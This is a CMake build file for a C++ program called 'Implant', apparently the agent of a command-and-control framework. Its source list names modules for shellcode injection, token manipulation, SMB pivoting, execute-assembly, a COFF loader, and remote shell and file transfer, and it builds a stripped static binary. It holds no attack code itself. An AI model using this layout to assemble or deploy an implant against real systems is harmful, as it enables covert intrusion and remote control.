cmake_minimum_required(VERSION 3.14)

project(Implant)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

include_directories(
    include
    external/json/include
)

add_executable(Implant
    src/Main.cpp

    # implant
    #
    src/Implant/Implant.cpp
    src/Implant/ImplantExecute.cpp
    src/Implant/ImplantJob.cpp
    src/Implant/ImplantTransport.cpp

    # peer-to-peer
    src/Peer/Peer.cpp
    src/Peer/Smb.cpp

    # channel
    #
    src/Channel/Channel.cpp

    # commands
    #
    src/Command/Command.cpp
    src/Command/CommandChannel.cpp
    src/Command/CommandExit.cpp
    src/Command/CommandPs.cpp
    src/Command/CommandCd.cpp
    src/Command/CommandCp.cpp
    src/Command/CommandShell.cpp
    src/Command/CommandDownload.cpp
    src/Command/CommandUpload.cpp
    src/Command/CommandRun.cpp
    src/Command/CommandExecuteAssembly.cpp
    src/Command/CommandJob.cpp
    src/Command/CommandInlineExecute.cpp
    src/Command/CommandInjectShellcode.cpp
    src/Command/CommandToken.cpp
    src/Command/CommandPivot.cpp

    # coff loader
    #
    src/Coff/BofApis.cpp
    src/Coff/CoffLoader.cpp
    src/Coff/CoffRelocations.cpp

    #
    # stdlib
    src/Stdlib/Base64.cpp
    src/Stdlib/Fs.cpp
    src/Stdlib/String.cpp
    src/Stdlib/Pipe.cpp
)

target_link_options(Implant PRIVATE
    "-Wl,--gc-sections"
    "-s"
    "-static"
    "-static-libgcc"
    "-static-libstdc++"
)

set(DEFAULT_CHANNEL "{0x0}" CACHE STRING "default channel")
set(DEFAULT_CHANNEL_CONFIG "{0x0}" CACHE STRING "default channel config")

target_compile_definitions(Implant PRIVATE "DEFAULT_CHANNEL_CONFIG=${DEFAULT_CHANNEL_CONFIG}")
target_compile_definitions(Implant PRIVATE "DEFAULT_CHANNEL=${DEFAULT_CHANNEL}")

# Debug mode
# target_compile_options(Implant PRIVATE -g -gcodeview)
# target_link_options(Implant PRIVATE
#     -fuse-ld=lld
#     -g
#     -Wl,-Bstatic -lstdc++ -lwinpthread -Wl,-Bdynamic
#     -Wl,--pdb=$<TARGET_FILE_DIR:Implant>/$<TARGET_FILE_BASE_NAME:Implant>.pdb
# )

target_link_libraries(Implant PRIVATE
    ntdll
    crypt32
    secur32
)
